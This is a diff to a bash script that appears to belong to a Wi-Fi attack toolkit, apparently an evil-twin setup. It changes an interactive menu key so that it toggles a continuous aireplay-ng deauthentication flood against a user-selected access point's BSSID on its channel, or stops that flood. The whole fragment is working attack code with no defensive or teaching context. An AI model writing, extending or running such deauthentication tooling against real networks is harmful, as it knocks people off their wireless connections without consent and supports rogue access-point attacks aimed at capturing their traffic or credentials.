@@ -1132,7 +1132,11 @@ HCONF
                         echo ""
                         case "${cmd}" in
                             d|D)
-                                if [ "${deauth_running}" == false ]; then
+                                if [ "${deauth_running}" == true ]; then
+                                    pkill -f "aireplay-ng" 2>/dev/null || true
+                                    deauth_running=false
+                                    echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Deauth stopped. Clients can reconnect now (press ${BOLD_YELLOW}d${GREEN} to resume).${WHITE}"
+                                else
                                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
                                     if [ -z "${MON_IFACE}" ]; then
                                         MON_IFACE="mon0"
@@ -1147,8 +1151,6 @@ HCONF
                                     iw dev "${MON_IFACE}" set channel ${selected_channel} 2>/dev/null || iwconfig "${MON_IFACE}" channel ${selected_channel} 2>/dev/null
                                     run_background "aireplay-ng -0 0 -a ${selected_bssid} ${MON_IFACE} --ignore-negative-one" "aireplay-ng"
                                     deauth_running=true
-                                else
-                                    echo -e "${WHITE}[${RED}!${WHITE}]${GREEN} Deauth already running.${WHITE}"
                                 fi
                                 ;;
                             c|C)
